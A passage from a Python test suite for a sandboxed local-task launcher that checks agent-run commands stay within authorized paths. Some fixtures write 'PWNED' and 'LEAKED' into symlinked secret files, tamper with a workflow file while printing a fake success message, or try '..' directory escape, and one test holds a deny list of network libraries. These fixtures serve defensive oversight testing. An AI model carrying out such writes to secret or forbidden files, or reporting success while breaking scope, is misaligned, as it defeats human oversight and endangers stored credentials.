        argv=(sys.executable, "-c", "open('unexpected.txt', 'w').write('x\\n')"),
        authorized_paths=("src/",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.authority_clean is False
    assert result.violations[0].path == "unexpected.txt"
    assert result.violations[0].reason == "OUTSIDE_AUTHORIZED_SCOPE"


def test_j_self_reported_success_does_not_override_authority_violation(tmp_path: Path) -> None:
    """A process that exits 0 and prints a success-shaped message on
    stdout, while having actually touched a forbidden path, must still be
    flagged -- enforcement never trusts the process's own report."""
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="J-001",
        argv=(
            sys.executable,
            "-c",
            "open('.github_workflow_tamper.txt','w').write('bad\\n'); "
            "print('TASK_COMPLETE: SUCCESS')",
        ),
        forbidden_paths=(".github_workflow_tamper.txt",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.exit_code == 0  # the process itself reported clean success
    assert result.authority_clean is False
    assert result.violations[0].reason == "FORBIDDEN_PATH"


def test_h_no_authorized_paths_declared_means_unrestricted_scope_but_forbidden_still_enforced(
    tmp_path: Path,
) -> None:
    """authorized_paths=() means "no positive allowlist declared" (every
    change passes the allowlist check), not "nothing is authorized" --
    but forbidden_paths is independent and always enforced regardless."""
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="H-002",
        argv=(sys.executable, "-c", "open('anywhere.txt', 'w').write('x\\n')"),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.authority_clean is True


# ---------------------------------------------------------------------------
# K. ZERO_NETWORK / ZERO_BILLING (structural, not just asserted)
# ---------------------------------------------------------------------------


def test_k_module_has_no_provider_sdk_or_network_library_dependency() -> None:
    """This module must not *functionally depend on* Cursor, OpenAI, or
    Anthropic, and must never itself perform network I/O -- it is a
    generic local-command launcher (its docstrings say so, in prose, by
    way of disclaiming exactly this, which is why this check is import-
    based rather than a naive substring scan over the whole file). No
    import of a network/HTTP library, no import of any provider-specific
    module (``cursor_bridge``, ``chatgpt_bridge``, or any ``requests``/
    ``httpx``/``urllib.request`` style dependency)."""
    import ast

    import project_atlas.orchestration.local_process_transport as module

    tree = ast.parse(Path(module.__file__).read_text(encoding="utf-8"))
    imported_names: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported_names.update(alias.name.split(".")[0] for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            imported_names.add(node.module.split(".")[0])
    forbidden_dependencies = {
        "cursor_bridge",
        "chatgpt_bridge",
        "chatgpt_capture",
        "requests",
        "httpx",
        "urllib3",
        "aiohttp",
        "socket",
    }
    assert not (imported_names & forbidden_dependencies)
    # ``urllib`` itself (stdlib) is allowed to appear as a substring of
    # other names, but this module must not import its network-capable
    # submodule.
    assert "urllib.request" not in Path(module.__file__).read_text(encoding="utf-8")


def test_k_deterministic_fixture_executor_performs_no_network_call(tmp_path: Path) -> None:
    """The fixture executor used throughout this suite is the local
    interpreter running an inline script with no imports capable of
    network access (``socket``, ``urllib``, ``http`` are never imported
    by any fixture command in this file) -- proving these tests exercise
    a real local process without any network dependency."""
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="K-001", argv=(sys.executable, "-c", "print('local only, no imports')")
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert result.exit_code == 0
    assert result.authority_clean is True


# ---------------------------------------------------------------------------
# L. FAIL_CLOSED_ON_MALFORMED_OR_MISSING_EXECUTABLE
# ---------------------------------------------------------------------------


def test_l_nonexistent_executable_fails_closed_not_silent_success(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(
        work_id="L-001", argv=("definitely-not-a-real-executable-xyz-12345",)
    )
    with pytest.raises((TransportError, OSError)):
        run_local_task(envelope, ENABLED, project_root=repo)


def test_l_empty_argv_is_rejected_at_construction_time() -> None:
    with pytest.raises(ValidationError):
        LocalTaskEnvelope(work_id="L-002", argv=())


# ---------------------------------------------------------------------------
# Cross-cutting: never claims merge/execution authority
# ---------------------------------------------------------------------------


def test_result_never_claims_merge_or_execution_authority(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    envelope = LocalTaskEnvelope(work_id="X-001", argv=("python3", "-c", "pass"))
    fake = _FakeProcessRunner(_ok_outcome())
    result = run_local_task(envelope, ENABLED, project_root=repo, runner=fake)
    assert result.merge_authorized is False
    assert result.execution_authorized is False


def test_cwd_traversal_via_dotdot_segment_is_rejected() -> None:
    with pytest.raises(ValidationError):
        LocalTaskEnvelope(work_id="SEC-001", argv=("python3",), cwd="a/../../escape")


def test_error_types_are_local_execution_error_subclasses() -> None:
    assert issubclass(LocalExecutionDisabledError, LocalExecutionError)


def test_i_declared_forbidden_dir_symlink_write_is_not_authority_clean(
    tmp_path: Path,
) -> None:
    """P1: a declared forbidden path that is itself a symlink to an
    outside store must not skip the snapshot. Writes through the link
    must fail closed (authority_clean=False). Nested planted links under
    an in-repo forbidden dir remain link-text-only (I-010 / I-012).
    """
    repo = _make_repo(tmp_path)
    outside = tmp_path / "outside_store"
    outside.mkdir()
    (outside / "key").write_text("SECRET_VALUE\n", encoding="utf-8")
    secrets = repo / "secrets"
    try:
        secrets.symlink_to(outside)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation not permitted in this environment")
    subprocess.run(["git", "add", "secrets"], cwd=repo, check=True)
    subprocess.run(
        ["git", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "track secrets link"],
        cwd=repo,
        check=True,
    )
    envelope = LocalTaskEnvelope(
        work_id="I-013",
        argv=(
            sys.executable,
            "-c",
            "from pathlib import Path; Path('secrets/key').write_text('PWNED\\n')",
        ),
        authorized_paths=("src/",),
        forbidden_paths=("secrets/",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert (outside / "key").read_text(encoding="utf-8") == "PWNED\n"
    assert result.authority_clean is False
    assert any(v.reason == "FORBIDDEN_PATH" for v in result.violations)
    assert result.merge_authorized is False
    assert result.execution_authorized is False


def test_i_declared_forbidden_file_symlink_write_is_not_authority_clean(
    tmp_path: Path,
) -> None:
    """P1 companion: declared forbidden *file* entry that is a symlink
    to an outside token must not certify authority_clean after a write.
    """
    repo = _make_repo(tmp_path)
    token = tmp_path / "outside_token"
    token.write_text("TOKEN\n", encoding="utf-8")
    link = repo / "secrets"
    try:
        link.symlink_to(token)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation not permitted in this environment")
    subprocess.run(["git", "add", "secrets"], cwd=repo, check=True)
    subprocess.run(
        ["git", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "track secrets file link"],
        cwd=repo,
        check=True,
    )
    envelope = LocalTaskEnvelope(
        work_id="I-014",
        argv=(
            sys.executable,
            "-c",
            "from pathlib import Path; Path('secrets').write_text('LEAKED\\n')",
        ),
        authorized_paths=("src/",),
        forbidden_paths=("secrets",),
    )
    result = run_local_task(envelope, ENABLED, project_root=repo)
    assert token.read_text(encoding="utf-8") == "LEAKED\n"
    assert result.authority_clean is False
    assert any(v.reason == "FORBIDDEN_PATH" for v in result.violations)
